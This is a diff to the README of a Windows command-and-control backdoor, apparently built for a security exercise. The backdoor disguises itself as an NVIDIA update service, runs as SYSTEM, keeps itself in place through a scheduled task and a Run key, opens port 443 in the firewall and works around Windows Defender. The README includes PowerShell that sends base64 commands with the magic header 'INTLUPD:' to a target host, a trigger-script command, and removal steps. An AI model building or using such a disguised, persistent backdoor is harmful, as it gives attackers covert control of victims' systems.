@@ -4,9 +4,9 @@
 
 ## Overview
 
-This is a WMI-based command and control shell for Windows that:
-- Listens on **port 443 (HTTPS)** - blends with normal traffic
-- Executes commands via **WMI** (legitimate Windows API)
+This is a command and control shell for Windows that:
+- Listens on **port 443 (TCP)** - blends with normal traffic
+- Executes commands via **CreateProcess** (fire-and-forget)
 - Multiple persistence mechanisms (survives reboots)
 - Disguised as **NVIDIA Graphics Update Service**
 - Runs with **SYSTEM privileges**
@@ -47,10 +47,58 @@ The installer will automatically:
 - ✓ Configure Windows Firewall (allow port 443)
 - ✓ Gracefully handle Windows Defender (if present)
 - ✓ Start the service immediately
-- ✓ Clean up temporary files
-- ✓ Verify all components installed correctly
+---
 
-### What the Install Script Does
+## USAGE
+
+### Command Format
+
+Send commands to the Windows system via TCP port 443. The payload must start with the magic header "INTLUPD:" followed by the base64-encoded command.
+
+**Example (using PowerShell):**
+```powershell
+$command = "whoami"
+$encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($command))
+$payload = "INTLUPD:" + $encoded
+$tcpClient = New-Object System.Net.Sockets.TcpClient("target-ip", 443)
+$stream = $tcpClient.GetStream()
+$writer = New-Object System.IO.StreamWriter($stream)
+$writer.Write($payload)
+$writer.Flush()
+$tcpClient.Close()
+```
+
+### Trigger Script
+
+Use the Python trigger script from the main project:
+```bash
+python trigger_break.py --level lvl1 --target 192.168.1.100
+```
+
+This automatically handles encoding and sending for Windows targets.
+
+### Persistence
+
+The backdoor persists across reboots via:
+- Scheduled Task (runs every 15 minutes + at startup)
+- Registry Run key (fallback)
+
+To remove persistence:
+```powershell
+# Remove Scheduled Task
+Unregister-ScheduledTask -TaskName "NVIDIA Graphics Driver Update" -Confirm:$false
+
+# Remove Registry key
+Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "NVIDIA Graphics Device" -ErrorAction SilentlyContinue
+
+# Kill process
+Stop-Process -Name "nvxgstd" -Force -ErrorAction SilentlyContinue
+
+# Delete file
+Remove-Item "C:\Windows\System32\nvxgstd.exe" -Force
+```
+
+---
 
 **Step-by-Step Installation Flow:**
 
